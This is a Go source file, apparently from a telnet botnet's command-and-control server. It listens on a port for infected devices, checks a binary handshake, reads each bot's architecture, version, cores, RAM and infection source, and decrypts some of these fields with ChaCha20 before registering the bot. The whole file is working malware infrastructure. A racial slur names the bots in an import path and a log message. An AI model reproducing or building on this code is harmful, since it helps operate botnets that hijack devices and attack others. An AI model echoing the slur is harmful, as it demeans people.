package slave_v2

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/niggers/encryption"
	"fmt"
	"net"
	"strings"
	"time"
)

func Serve() {
	tel, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Slave.SlavePort))
	if err != nil {
		fmt.Println(err)
		return
	}

	config.Logger.Info("Listening for niggers connections", "port", config.Slave.SlavePort)

	for {
		conn, err := tel.Accept()
		if err != nil {
			fmt.Println(err)
			continue
		}

		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			var arch = Read(conn, false)
			var version = Read(conn, false)

			if version == "d3d7595e" || version == "unk" {
				return
			}

			switch version {
			case "481c3fe":
				version = "1.9.7"
			case "d846cda1":
				version = "1.9.8"
			case "d3d7595e2":
				version = "1.9.9"
			}

			if !(version == "1.9.7" || version == "1.9.8") {
				var cores = Read(conn, version != "1.9.9")
				var ram = Read(conn, version != "1.9.9")
				var source = Read(conn, version != "1.9.9")
				Handle(conn, arch, version, strings.ToLower(source), cores, ram)
				return
			}

			var source = Read(conn, false)
			Handle(conn, arch, version, strings.ToLower(source), "unk", "unk")
		}
	}
}

func Read(conn net.Conn, decrypt bool) string {
	stringLen := make([]byte, 1)
	l, err := conn.Read(stringLen)
	if err != nil || l <= 0 {
		return ""
	}

	var source string
	if stringLen[0] > 0 {
		sourceBuf := make([]byte, stringLen[0])
		l, err := conn.Read(sourceBuf)
		if err != nil || l <= 0 {
			return ""
		}

		if decrypt {
			encryption.Chacha20(encryption.Key, 1, encryption.Nonce, sourceBuf, sourceBuf)
		}

		source = string(sourceBuf)
	}

	if len(source) < 1 {
		source = "unk"
	}

	return source
}
